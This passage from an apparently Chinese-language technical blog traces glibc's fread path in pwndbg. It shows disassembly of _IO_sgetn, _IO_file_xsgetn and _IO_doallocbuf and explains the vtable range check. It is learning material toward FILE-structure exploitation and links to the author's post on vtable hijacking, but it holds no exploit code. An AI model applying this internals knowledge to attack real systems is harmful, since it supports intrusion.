0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8dfe6 &lt;_IO_sgetn+22&gt;    sub    rsp, 0x20                       RSP =&gt; 0x7fffffffdc70 (0x7fffffffdc90 - 0x20)</span><br><span class="line">0x7ffff7c8dfea &lt;_IO_sgetn+26&gt;    mov    rbx, qword ptr [rdi + 0xd8]     RBX, [0x555555559378] =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8dff1 &lt;_IO_sgetn+33&gt;    mov    r8, rbx                         R8 =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8dff4 &lt;_IO_sgetn+36&gt;    sub    r8, rcx                         R8 =&gt; 0xc00 (0x7ffff7e17600 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8dff7 &lt;_IO_sgetn+39&gt;    cmp    rax, r8                         0xd68 - 0xc00     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8dffa &lt;_IO_sgetn+42&gt;  ✘ jbe    _IO_sgetn+64                &lt;_IO_sgetn+64&gt;</span><br></pre></td></tr></table></figure><p>可以看到先计算了<code>_IO_helper_jumps</code> 到某个地址的偏移，又判断了<code>vtable</code>（注意看<code>mov    rbx, qword ptr [rdi + 0xd8]</code>，0xd8正是<code>vtable</code>在<code>_IO_FILE_plus</code>中的偏移）是否在 <code>_IO_helper_jumps</code> 范围之外<br> <code>&lt;_IO_sgetn+64&gt;</code>处正是<code>_IO_vtable_check</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c8e010 &lt;+64&gt;:    mov    QWORD PTR [rsp+0x18],rdx</span><br><span class="line">0x00007ffff7c8e015 &lt;+69&gt;:    mov    QWORD PTR [rsp+0x10],rsi</span><br><span class="line">0x00007ffff7c8e01a &lt;+74&gt;:    mov    QWORD PTR [rsp+0x8],rdi</span><br><span class="line">0x00007ffff7c8e01f &lt;+79&gt;:    call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br></pre></td></tr></table></figure><p>jbe跳转，表示如果 rax &lt;&#x3D; r8，则跳转，即<code>vtable</code>在不在指定范围内，调用<code>_IO_vtable_check</code>来进一步检查（见另一篇<a href="https://r3t2.top/2025/07/27/%E5%8A%AB%E6%8C%81vtable%E4%BB%A5%E5%8F%8AFSOP/">博客</a>）<br>后续调用<code>vtable</code>中的<code>_IO_file_xsgetn</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8dffc &lt;_IO_sgetn+44&gt;              mov    rax, qword ptr [rbx + 0x40]     RAX, [_IO_file_jumps+64] =&gt; 0x7ffff7c8b2b0 (__GI__IO_file_xsgetn) ◂— endbr64</span><br><span class="line">0x7ffff7c8e000 &lt;_IO_sgetn+48&gt;              add    rsp, 0x20                       RSP =&gt; 0x7fffffffdc90 (0x7fffffffdc70 + 0x20)</span><br><span class="line">0x7ffff7c8e004 &lt;_IO_sgetn+52&gt;              pop    rbx                             RBX =&gt; 0x5555555592a0</span><br><span class="line">0x7ffff7c8e005 &lt;_IO_sgetn+53&gt;              jmp    rax                         &lt;__GI__IO_file_xsgetn&gt;</span><br></pre></td></tr></table></figure><p>可以看到<code>rbx</code>存储的是<code>vtable</code>地址，<code>rbx + 0x40</code>正是虚表中<code>_IO_file_xsgetn</code>函数<br>放上<code>_IO_file_xsgetn</code>的汇编<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function __GI__IO_file_xsgetn:</span><br><span class="line">=&gt; 0x00007ffff7c8b2b0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8b2b4 &lt;+4&gt;:     push   r15</span><br><span class="line">   0x00007ffff7c8b2b6 &lt;+6&gt;:     push   r14</span><br><span class="line">   0x00007ffff7c8b2b8 &lt;+8&gt;:     push   r13</span><br><span class="line">   0x00007ffff7c8b2ba &lt;+10&gt;:    mov    r13,rsi</span><br><span class="line">   0x00007ffff7c8b2bd &lt;+13&gt;:    push   r12</span><br><span class="line">   0x00007ffff7c8b2bf &lt;+15&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c8b2c0 &lt;+16&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c8b2c1 &lt;+17&gt;:    mov    rbx,rdi</span><br><span class="line">   0x00007ffff7c8b2c4 &lt;+20&gt;:    sub    rsp,0x18</span><br><span class="line">   0x00007ffff7c8b2c8 &lt;+24&gt;:    cmp    QWORD PTR [rdi+0x38],0x0</span><br><span class="line">   0x00007ffff7c8b2cd &lt;+29&gt;:    mov    QWORD PTR [rsp],rdx</span><br><span class="line">   0x00007ffff7c8b2d1 &lt;+33&gt;:    je     0x7ffff7c8b4a8 &lt;__GI__IO_file_xsgetn+504&gt;</span><br><span class="line">   0x00007ffff7c8b2d7 &lt;+39&gt;:    mov    rax,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b2db &lt;+43&gt;:    lea    r15,[rip+0x18b71e]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8b2e2 &lt;+50&gt;:    lea    r14,[rip+0x18c47f]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8b2e9 &lt;+57&gt;:    sub    r14,r15</span><br><span class="line">   0x00007ffff7c8b2ec &lt;+60&gt;:    mov    r12,rax</span><br><span class="line">   0x00007ffff7c8b2ef &lt;+63&gt;:    test   rax,rax</span><br><span class="line">   0x00007ffff7c8b2f2 &lt;+66&gt;:    je     0x7ffff7c8b3c4 &lt;__GI__IO_file_xsgetn+276&gt;</span><br><span class="line">   0x00007ffff7c8b2f8 &lt;+72&gt;:    nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b300 &lt;+80&gt;:    mov    rsi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00007ffff7c8b304 &lt;+84&gt;:    mov    rbp,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x00007ffff7c8b308 &lt;+88&gt;:    sub    rbp,rsi</span><br><span class="line">   0x00007ffff7c8b30b &lt;+91&gt;:    cmp    rbp,r12</span><br><span class="line">   0x00007ffff7c8b30e &lt;+94&gt;:    jae    0x7ffff7c8b418 &lt;__GI__IO_file_xsgetn+360&gt;</span><br><span class="line">   0x00007ffff7c8b314 &lt;+100&gt;:   test   rbp,rbp</span><br><span class="line">   0x00007ffff7c8b317 &lt;+103&gt;:   jne    0x7ffff7c8b3d8 &lt;__GI__IO_file_xsgetn+296&gt;</span><br><span class="line">   0x00007ffff7c8b31d &lt;+109&gt;:   test   DWORD PTR [rbx],0x100</span><br><span class="line">   0x00007ffff7c8b323 &lt;+115&gt;:   jne    0x7ffff7c8b3f9 &lt;__GI__IO_file_xsgetn+329&gt;</span><br><span class="line">   0x00007ffff7c8b329 &lt;+121&gt;:   mov    rcx,QWORD PTR [rbx+0x38]</span><br><span class="line">   0x00007ffff7c8b32d &lt;+125&gt;:   test   rcx,rcx</span><br><span class="line">   0x00007ffff7c8b330 &lt;+128&gt;:   je     0x7ffff7c8b3d0 &lt;__GI__IO_file_xsgetn+288&gt;</span><br><span class="line">   0x00007ffff7c8b336 &lt;+134&gt;:   mov    rsi,QWORD PTR [rbx+0x40]</span><br><span class="line">   0x00007ffff7c8b33a &lt;+138&gt;:   sub    rsi,rcx</span><br><span class="line">   0x00007ffff7c8b33d &lt;+141&gt;:   cmp    rsi,r12</span><br><span class="line">   0x00007ffff7c8b340 &lt;+144&gt;:   ja     0x7ffff7c8b430 &lt;__GI__IO_file_xsgetn+384&gt;</span><br><span class="line">   0x00007ffff7c8b346 &lt;+150&gt;:   cmp    rsi,0x7f</span><br><span class="line">   0x00007ffff7c8b34a &lt;+154&gt;:   jbe    0x7ffff7c8b3d0 &lt;__GI__IO_file_xsgetn+288&gt;</span><br><span class="line">   0x00007ffff7c8b350 &lt;+160&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c8b353 &lt;+163&gt;:   xor    edx,edx</span><br><span class="line">   0x00007ffff7c8b355 &lt;+165&gt;:   div    rsi</span><br><span class="line">   0x00007ffff7c8b358 &lt;+168&gt;:   mov    rdi,rdx</span><br><span class="line">   0x00007ffff7c8b35b &lt;+171&gt;:   mov    rdx,r12</span><br><span class="line">   0x00007ffff7c8b35e &lt;+174&gt;:   sub    rdx,rdi</span><br><span class="line">   0x00007ffff7c8b361 &lt;+177&gt;:   mov    rbp,QWORD PTR [rbx+0xd8]</span><br><span class="line">   0x00007ffff7c8b368 &lt;+184&gt;:   movq   xmm0,rcx</span><br><span class="line">   0x00007ffff7c8b36d &lt;+189&gt;:   punpcklqdq xmm0,xmm0</span><br><span class="line">   0x00007ffff7c8b371 &lt;+193&gt;:   mov    rax,rbp</span><br><span class="line">   0x00007ffff7c8b374 &lt;+196&gt;:   movups XMMWORD PTR [rbx+0x8],xmm0</span><br><span class="line">   0x00007ffff7c8b378 &lt;+200&gt;:   sub    rax,r15</span><br><span class="line">   0x00007ffff7c8b37b &lt;+203&gt;:   movups XMMWORD PTR [rbx+0x18],xmm0</span><br><span class="line">   0x00007ffff7c8b37f &lt;+207&gt;:   movups XMMWORD PTR [rbx+0x28],xmm0</span><br><span class="line">   0x00007ffff7c8b383 &lt;+211&gt;:   cmp    r14,rax</span><br><span class="line">   0x00007ffff7c8b386 &lt;+214&gt;:   jbe    0x7ffff7c8b460 &lt;__GI__IO_file_xsgetn+432&gt;</span><br><span class="line">   0x00007ffff7c8b38c &lt;+220&gt;:   mov    rsi,r13</span><br><span class="line">   0x00007ffff7c8b38f &lt;+223&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8b392 &lt;+226&gt;:   call   QWORD PTR [rbp+0x70]</span><br><span class="line">   0x00007ffff7c8b395 &lt;+229&gt;:   test   rax,rax</span><br><span class="line">   0x00007ffff7c8b398 &lt;+232&gt;:   jle    0x7ffff7c8b488 &lt;__GI__IO_file_xsgetn+472&gt;</span><br><span class="line">   0x00007ffff7c8b39e &lt;+238&gt;:   mov    rdx,QWORD PTR [rbx+0x90]</span><br><span class="line">   0x00007ffff7c8b3a5 &lt;+245&gt;:   add    r13,rax</span><br><span class="line">   0x00007ffff7c8b3a8 &lt;+248&gt;:   sub    r12,rax</span><br><span class="line">   0x00007ffff7c8b3ab &lt;+251&gt;:   cmp    rdx,0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8b3af &lt;+255&gt;:   je     0x7ffff7c8b3bb &lt;__GI__IO_file_xsgetn+267&gt;</span><br><span class="line">   0x00007ffff7c8b3b1 &lt;+257&gt;:   add    rdx,rax</span><br><span class="line">   0x00007ffff7c8b3b4 &lt;+260&gt;:   mov    QWORD PTR [rbx+0x90],rdx</span><br><span class="line">   0x00007ffff7c8b3bb &lt;+267&gt;:   test   r12,r12</span><br><span class="line">   0x00007ffff7c8b3be &lt;+270&gt;:   jne    0x7ffff7c8b300 &lt;__GI__IO_file_xsgetn+80&gt;</span><br><span class="line">   0x00007ffff7c8b3c4 &lt;+276&gt;:   mov    r13,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b3c8 &lt;+280&gt;:   jmp    0x7ffff7c8b448 &lt;__GI__IO_file_xsgetn+408&gt;</span><br><span class="line">   0x00007ffff7c8b3ca &lt;+282&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b3d0 &lt;+288&gt;:   mov    rdx,r12</span><br><span class="line">   0x00007ffff7c8b3d3 &lt;+291&gt;:   jmp    0x7ffff7c8b361 &lt;__GI__IO_file_xsgetn+177&gt;</span><br><span class="line">   0x00007ffff7c8b3d5 &lt;+293&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8b3d8 &lt;+296&gt;:   mov    rdi,r13</span><br><span class="line">   0x00007ffff7c8b3db &lt;+299&gt;:   mov    rdx,rbp</span><br><span class="line">   0x00007ffff7c8b3de &lt;+302&gt;:   sub    r12,rbp</span><br><span class="line">   0x00007ffff7c8b3e1 &lt;+305&gt;:   call   0x7ffff7c283e0 &lt;*ABS*+0xa97d0@plt&gt;</span><br><span class="line">   0x00007ffff7c8b3e6 &lt;+310&gt;:   add    QWORD PTR [rbx+0x8],rbp</span><br><span class="line">   0x00007ffff7c8b3ea &lt;+314&gt;:   mov    r13,rax</span><br><span class="line">   0x00007ffff7c8b3ed &lt;+317&gt;:   test   DWORD PTR [rbx],0x100</span><br><span class="line">   0x00007ffff7c8b3f3 &lt;+323&gt;:   je     0x7ffff7c8b329 &lt;__GI__IO_file_xsgetn+121&gt;</span><br><span class="line">   0x00007ffff7c8b3f9 &lt;+329&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8b3fc &lt;+332&gt;:   call   0x7ffff7c8d6b0 &lt;_IO_switch_to_main_get_area&gt;</span><br><span class="line">   0x00007ffff7c8b401 &lt;+337&gt;:   mov    rsi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00007ffff7c8b405 &lt;+341&gt;:   mov    rbp,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x00007ffff7c8b409 &lt;+345&gt;:   sub    rbp,rsi</span><br><span class="line">   0x00007ffff7c8b40c &lt;+348&gt;:   cmp    rbp,r12</span><br><span class="line">   0x00007ffff7c8b40f &lt;+351&gt;:   jb     0x7ffff7c8b314 &lt;__GI__IO_file_xsgetn+100&gt;</span><br><span class="line">   0x00007ffff7c8b415 &lt;+357&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8b418 &lt;+360&gt;:   mov    rdi,r13</span><br><span class="line">   0x00007ffff7c8b41b &lt;+363&gt;:   mov    rdx,r12</span><br><span class="line">   0x00007ffff7c8b41e &lt;+366&gt;:   call   0x7ffff7c28620 &lt;*ABS*+0xa9c10@plt&gt;</span><br><span class="line">   0x00007ffff7c8b423 &lt;+371&gt;:   add    QWORD PTR [rbx+0x8],r12</span><br><span class="line">   0x00007ffff7c8b427 &lt;+375&gt;:   mov    r13,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b42b &lt;+379&gt;:   jmp    0x7ffff7c8b448 &lt;__GI__IO_file_xsgetn+408&gt;</span><br><span class="line">   0x00007ffff7c8b42d &lt;+381&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8b430 &lt;+384&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8b433 &lt;+387&gt;:   call   0x7ffff7c8d870 &lt;__GI___underflow&gt;</span><br><span class="line">   0x00007ffff7c8b438 &lt;+392&gt;:   cmp    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8b43b &lt;+395&gt;:   jne    0x7ffff7c8b300 &lt;__GI__IO_file_xsgetn+80&gt;</span><br><span class="line">   0x00007ffff7c8b441 &lt;+401&gt;:   mov    r13,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b445 &lt;+405&gt;:   sub    r13,r12</span><br><span class="line">   0x00007ffff7c8b448 &lt;+408&gt;:   add    rsp,0x18</span><br><span class="line">   0x00007ffff7c8b44c &lt;+412&gt;:   mov    rax,r13</span><br><span class="line">   0x00007ffff7c8b44f &lt;+415&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8b450 &lt;+416&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8b451 &lt;+417&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8b453 &lt;+419&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8b455 &lt;+421&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c8b457 &lt;+423&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c8b459 &lt;+425&gt;:   ret</span><br><span class="line">   0x00007ffff7c8b45a &lt;+426&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b460 &lt;+432&gt;:   mov    QWORD PTR [rsp+0x8],rdx</span><br><span class="line">   0x00007ffff7c8b465 &lt;+437&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8b46a &lt;+442&gt;:   mov    rdx,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00007ffff7c8b46f &lt;+447&gt;:   mov    rsi,r13</span><br><span class="line">   0x00007ffff7c8b472 &lt;+450&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8b475 &lt;+453&gt;:   call   QWORD PTR [rbp+0x70]</span><br><span class="line">   0x00007ffff7c8b478 &lt;+456&gt;:   test   rax,rax</span><br><span class="line">   0x00007ffff7c8b47b &lt;+459&gt;:   jg     0x7ffff7c8b39e &lt;__GI__IO_file_xsgetn+238&gt;</span><br><span class="line">   0x00007ffff7c8b481 &lt;+465&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8b488 &lt;+472&gt;:   mov    edx,DWORD PTR [rbx]</span><br><span class="line">   0x00007ffff7c8b48a &lt;+474&gt;:   mov    r13,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b48e &lt;+478&gt;:   mov    ecx,edx</span><br><span class="line">   0x00007ffff7c8b490 &lt;+480&gt;:   sub    r13,r12</span><br><span class="line">   0x00007ffff7c8b493 &lt;+483&gt;:   or     edx,0x10</span><br><span class="line">   0x00007ffff7c8b496 &lt;+486&gt;:   or     ecx,0x20</span><br><span class="line">   0x00007ffff7c8b499 &lt;+489&gt;:   test   rax,rax</span><br><span class="line">   0x00007ffff7c8b49c &lt;+492&gt;:   cmovne edx,ecx</span><br><span class="line">   0x00007ffff7c8b49f &lt;+495&gt;:   mov    DWORD PTR [rbx],edx</span><br><span class="line">   0x00007ffff7c8b4a1 &lt;+497&gt;:   jmp    0x7ffff7c8b448 &lt;__GI__IO_file_xsgetn+408&gt;</span><br><span class="line">   0x00007ffff7c8b4a3 &lt;+499&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b4a8 &lt;+504&gt;:   mov    rdi,QWORD PTR [rdi+0x48]</span><br><span class="line">   0x00007ffff7c8b4ac &lt;+508&gt;:   test   rdi,rdi</span><br><span class="line">   0x00007ffff7c8b4af &lt;+511&gt;:   je     0x7ffff7c8b4bc &lt;__GI__IO_file_xsgetn+524&gt;</span><br><span class="line">   0x00007ffff7c8b4b1 &lt;+513&gt;:   call   0x7ffff7c28370 &lt;free@plt&gt;</span><br><span class="line">   0x00007ffff7c8b4b6 &lt;+518&gt;:   and    DWORD PTR [rbx],0xfffffeff</span><br><span class="line">   0x00007ffff7c8b4bc &lt;+524&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8b4bf &lt;+527&gt;:   call   0x7ffff7c8dc90 &lt;__GI__IO_doallocbuf&gt;</span><br><span class="line">   0x00007ffff7c8b4c4 &lt;+532&gt;:   jmp    0x7ffff7c8b2d7 &lt;__GI__IO_file_xsgetn+39&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p><strong><code>_IO_file_xsgetn</code>函数是fread的核心，其大致流程整体是一个循环，先检查读缓冲区状态（<code>fp-&gt;_IO_read_end</code> - <code>fp-&gt;_IO_read_ptr</code>），大于0则从<code>fp-&gt;_IO_read_ptr</code>读取数据到目标，并更新读指针，如果读缓冲区为空则会调用<code>__underflow</code>函数再读取（第一次读写前<code>_IO_file_xsgetn</code>会先调用<code>_IO_doallocbuf</code>分配缓冲区）</strong><br>回到调试，<code>_IO_file_xsgetn</code>先保存寄存器和读取字节数，这一部分就懒得放了（上面代码可以看到）,然后检查 <code>_IO_buf_base</code> (<code>[rdi + 0x38]</code>处)是否为0，为0则说明无缓冲区，调用<code>_IO_doallocbuf</code>分配缓冲区<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b2c4 &lt;__GI__IO_file_xsgetn+20&gt;     sub    rsp, 0x18                     RSP =&gt; 0x7fffffffdc50 (0x7fffffffdc68 - 0x18)</span><br><span class="line">0x7ffff7c8b2c8 &lt;__GI__IO_file_xsgetn+24&gt;     cmp    qword ptr [rdi + 0x38], 0     0 - 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b2cd &lt;__GI__IO_file_xsgetn+29&gt;     mov    qword ptr [rsp], rdx          [0x7fffffffdc50] &lt;= 0x14</span><br><span class="line">0x7ffff7c8b2d1 &lt;__GI__IO_file_xsgetn+33&gt;   ✔ je     __GI__IO_file_xsgetn+504    &lt;__GI__IO_file_xsgetn+504&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8b4a8 &lt;__GI__IO_file_xsgetn+504&gt;    mov    rdi, qword ptr [rdi + 0x48]     RDI, [0x5555555592e8] =&gt; 0</span><br><span class="line">0x7ffff7c8b4ac &lt;__GI__IO_file_xsgetn+508&gt;    test   rdi, rdi                        0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b4af &lt;__GI__IO_file_xsgetn+511&gt;  ✔ je     __GI__IO_file_xsgetn+524    &lt;__GI__IO_file_xsgetn+524&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8b4bc &lt;__GI__IO_file_xsgetn+524&gt;    mov    rdi, rbx                        RDI =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c8b4bf &lt;__GI__IO_file_xsgetn+527&gt;    call   _IO_doallocbuf              &lt;_IO_doallocbuf&gt;</span><br></pre></td></tr></table></figure><p><code>_IO_doallocbuf</code>函数还会调用<code>vtable-&gt;_IO_file_doallocate</code>函数（会进行安全检测），最终实现分配 <code>_IO_buf_base</code> ~ <code>_IO_buf_end</code> 之间的缓冲区（调用<code>malloc</code>分配堆上内存）<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8dcb7 &lt;_IO_doallocbuf+39&gt;    mov    rbp, qword ptr [rbx + 0xd8]     RBP, [0x555555559378] =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8dcbe &lt;_IO_doallocbuf+46&gt;    lea    rdx, [rip + 0x188d3b]           RDX =&gt; 0x7ffff7e16a00 (_IO_helper_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8dcc5 &lt;_IO_doallocbuf+53&gt;    lea    rax, [rip + 0x189a9c]           RAX =&gt; 0x7ffff7e17768 ◂— 0</span><br><span class="line">0x7ffff7c8dccc &lt;_IO_doallocbuf+60&gt;    sub    rax, rdx                        RAX =&gt; 0xd68 (0x7ffff7e17768 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8dccf &lt;_IO_doallocbuf+63&gt;    mov    rcx, rbp                        RCX =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8dcd2 &lt;_IO_doallocbuf+66&gt;    sub    rcx, rdx                        RCX =&gt; 0xc00 (0x7ffff7e17600 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8dcd5 &lt;_IO_doallocbuf+69&gt;    cmp    rax, rcx                        0xd68 - 0xc00     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8dcd8 &lt;_IO_doallocbuf+72&gt;:    jbe    0x7ffff7c8dd40 &lt;__GI__IO_doallocbuf+176&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8dd40 &lt;_IO_doallocbuf+176&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br></pre></td></tr></table></figure><p>安全检查如上<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8dcda &lt;_IO_doallocbuf+74&gt;     mov    rdi, rbx     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c8dcdd &lt;_IO_doallocbuf+77&gt;     call   qword ptr [rbp + 0x68]      &lt;_IO_file_doallocate&gt;</span><br></pre></td></tr></table></figure><p>具体代码就不放了，其还会调用<code>_IO_file_stat</code>函数再调用<code>fstat64</code>函数来保存文件状态，然后调用<code>_IO_setb</code>函数来设置<code>fp-&gt;_IO_buf_base</code> &#x3D; buf，<code>fp-&gt;_IO_buf_end</code> &#x3D; ebuf，并设置 <code>_IO_save_base</code>, <code>_IO_backup_base</code> ,<code>fp-&gt;_IO_save_end</code>指针为0<br>我们看最后<code>_IO_doallocbuf</code>结束后结构体的状态<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$5 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 